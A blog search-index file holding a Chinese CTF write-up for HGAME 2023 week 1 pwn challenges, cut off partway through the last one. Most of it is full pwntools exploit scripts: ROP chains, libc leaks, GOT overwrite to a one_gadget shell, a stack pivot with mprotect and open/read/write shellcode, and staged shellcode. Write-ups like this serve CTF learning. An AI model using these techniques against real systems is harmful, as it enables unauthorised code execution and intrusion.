<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2023hgame-week1</title>
      <link href="/2023/01/13/2023hgame-week1/2023hgame-week1/"/>
      <url>/2023/01/13/2023hgame-week1/2023hgame-week1/</url>
      
        <content type="html"><![CDATA[<h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p><strong>知识点：</strong>标准输出(close(1))和标准错误(close(2))，有shell但获得不了输出。可以通过exec 1&gt;&amp;0来把标准输出重定向到文件描述符0(标准输入)，这个文件默认是开启的。这样我们就可以看到输出了</p><p>exec有两个作用</p><ol><li>代替shell执行命令，区别是shell执行完之后会回到shell，而exec会直接退出。</li><li>文件重定向，也就是<code>exec 1&gt;&amp;0</code>这样将文件描述符为1的文件重定向到0上</li></ol><p><strong>思路</strong>：利用backdoor来getshell之后输入exec 1&gt;&amp;0进行文件重定向</p><p><strong>完整exp如下</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'week-1.hgame.lwsec.cn'</span><span class="token punctuation">,</span><span class="token number">31793</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>backdoor <span class="token operator">=</span> <span class="token number">0x401176</span>bin_sh <span class="token operator">=</span> <span class="token number">0x402004</span>system <span class="token operator">=</span> <span class="token number">0x401060</span>rdi <span class="token operator">=</span> <span class="token number">0x0000000000401233</span>read <span class="token operator">=</span> <span class="token number">0x4011A8</span>p1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'exec 1>&amp;0'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><p><strong>分析：</strong></p><p>读入v0作为数组下标，对小于0时未做限制，因此可以利用数组向上覆盖任意地址内容或定位到任意地址来泄露地址</p><p>vuln函数最后exit（0）结束程序导致不能二次利用，所以第一步先将exit_got覆盖成vuln_addr使程序可以被二次利用</p><p>由于使用的下标是16*v0，则计算v0：（所求地址-seats地址）&#x2F;16</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#将exit覆盖成vuln</span>index1 <span class="token operator">=</span> <span class="token punctuation">(</span>exit <span class="token operator">-</span> seat<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">16</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Here is the seat from 0 to 9, please choose one.'</span> <span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>index1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your name\n'</span> <span class="token punctuation">,</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>linux自带ASLR地址随机化每次程序运行时函数地址都不同， 但是由于函数与libc之间的相对距离不变，所以可以间接通过泄露函数地址求libc地址</p><p>为了不影响程序的正常运行，这里选择泄露位于main函数中不会再被用到的setbuf</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">index2 <span class="token operator">=</span> <span class="token punctuation">(</span>setbuf <span class="token operator">-</span> seat<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">16</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Here is the seat from 0 to 9, please choose one.'</span> <span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>index2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your name'</span> <span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>li<span class="token punctuation">(</span><span class="token string">'leak_addr = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用泄露的setbuf地址和相对位置计算libc地址</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#leak_addr - libc = 0x8ba0a</span>libc_base <span class="token operator">=</span> leak_addr <span class="token operator">-</span> <span class="token number">0x8ba0a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来就是利用one_gadget来getshell了，还是选择exit位置将其覆盖成one_gadget，这样程序运行到结束就可以getshell了</p><p><strong>完整exp如下</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'week-1.hgame.lwsec.cn'</span><span class="token punctuation">,</span><span class="token number">31205</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>seat <span class="token operator">=</span> <span class="token number">0x4040A0</span>exit <span class="token operator">=</span> <span class="token number">0x404040</span>vuln <span class="token operator">=</span> <span class="token number">0x4011D6</span>setbuf <span class="token operator">=</span> <span class="token number">0x404020</span>index1 <span class="token operator">=</span> <span class="token punctuation">(</span>exit <span class="token operator">-</span> seat<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">16</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Here is the seat from 0 to 9, please choose one.'</span> <span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>index1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your name\n'</span> <span class="token punctuation">,</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span><span class="token punctuation">)</span>index2 <span class="token operator">=</span> <span class="token punctuation">(</span>setbuf <span class="token operator">-</span> seat<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">16</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Here is the seat from 0 to 9, please choose one.'</span> <span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>index2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your name'</span> <span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>li<span class="token punctuation">(</span><span class="token string">'leak_addr = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#leak_addr - libc = 0x8ba0a</span>libc_base <span class="token operator">=</span> leak_addr <span class="token operator">-</span> <span class="token number">0x8ba0a</span>                                                                                                                      one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe3afe</span> <span class="token punctuation">,</span> <span class="token number">0xe3b01</span> <span class="token punctuation">,</span> <span class="token number">0xe3b04</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baser<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Here is the seat from 0 to 9, please choose one.'</span> <span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>index1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'please input your name'</span> <span class="token punctuation">,</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><p><strong>分析：</strong></p><p>orw,即利用open、read、write获取flag</p><p>查看sandbox禁用的函数：seccomp-tools dump .&#x2F;文件名 ，本题禁用了execve，因此不能使用execve和system</p><p>本题需要利用shellcraft写入shellcode，缺少可执行段，需要调用mprotect来修改权限，而通过系统调用执行mprotect需要控制寄存器的gadgets，利用ROPgadget不能获得全部所需gadgets，因此需要利用libc中的gadgets，所以第一步泄露libc_base</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Maybe you can learn something about seccomp, before you try to solve this task.'</span> <span class="token punctuation">,</span> p1<span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>li<span class="token punctuation">(</span><span class="token string">'puts_addr = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来就可以利用ROPgadget得到libc中的gadgets</p><p>由于溢出空间为0x30不足以写orw_rop链，因此要栈迁移</p><p>1.利用如下gadgets控制rbp进行任意地址写到0x404110并调用read再次利用栈溢出</p><pre class="line-numbers language-none"><code class="language-none">.text:00000000004012CF 48 8D 85 00 FF FF FF          lea     rax, [rbp+buf].text:00000000004012D6 BA 30 01 00 00                mov     edx, 130h                       ; nbytes.text:00000000004012DB 48 89 C6                      mov     rsi, rax                        ; buf.text:00000000004012DE BF 00 00 00 00                mov     edi, 0                          ; fd.text:00000000004012E3 B8 00 00 00 00                mov     eax, 0.text:00000000004012E8 E8 93 FD FF FF                call    _read<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.布置payload：调用mprotect创造有可执行权限的空间，写入shellcode，迁移到0x404110</p><p><strong>完整exp如下：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'week-1.hgame.lwsec.cn'</span><span class="token punctuation">,</span><span class="token number">31178</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401393</span>p1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Maybe you can learn something about seccomp, before you try to solve this task.'</span> <span class="token punctuation">,</span> p1<span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>li<span class="token punctuation">(</span><span class="token string">'puts_addr = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>payload_addr <span class="token operator">=</span> <span class="token number">0x4040C0</span> <span class="token operator">+</span> <span class="token number">0x50</span>pop_rbp_ret <span class="token operator">=</span> <span class="token number">0x000000000040117d</span>gadget <span class="token operator">=</span> <span class="token number">0x4012CF</span>pop_rsi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000002601f</span>pop_rdx_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000142c92</span>pop_rax_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000036174</span>p1 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rbp_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>payload_addr <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gadget<span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p1<span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token punctuation">)</span>leave_ret <span class="token operator">=</span> <span class="token number">0x00000000004012be</span>syscall_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">"syscall\nret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x404000</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>payload_addr <span class="token operator">+</span> <span class="token number">8</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment">#orw_addr</span><span class="token comment">#p2 += p64(0)</span>p2 <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x404300</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p2 <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x404300</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p2 <span class="token operator">=</span> p2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>payload_addr <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p2<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h3><p><strong>分析：</strong></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">mmap((void *)0xCAFE0000LL, 0x1000uLL, 7, 33, -1, 0LL);puts(&quot;Please input your shellcode:&quot;);read(0, (void *)0xCAFE0000LL, 0x10uLL);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>mmap创建大小为0x1000起始地址为0xCAFE0000LL且拥有rwx权限的堆</p><p>read向堆中输入大小为0x10的shellcode，由于可利用大小太小所以要利用程序中gadgets再次read一段较大的shellcode</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">.text:00000000000013B0 48 8B 55 F8                   mov     rdx, [rbp+buf].text:00000000000013B4 B8 00 00 00 00                mov     eax, 0.text:00000000000013B9 FF D2                         call    rdx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在call之前已经提供了rdx和rax，因此只需要读入rdi和rsi，由于读入长度有限所以使用<em>xor edi，edi</em>比<em>mov rdi，0</em>长度更短</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p1 <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''xor edi,edimov rsi,0xCAFE0000syscall'''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后输入shellcode即可返回flag</p><p><strong>完整exp如下：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token 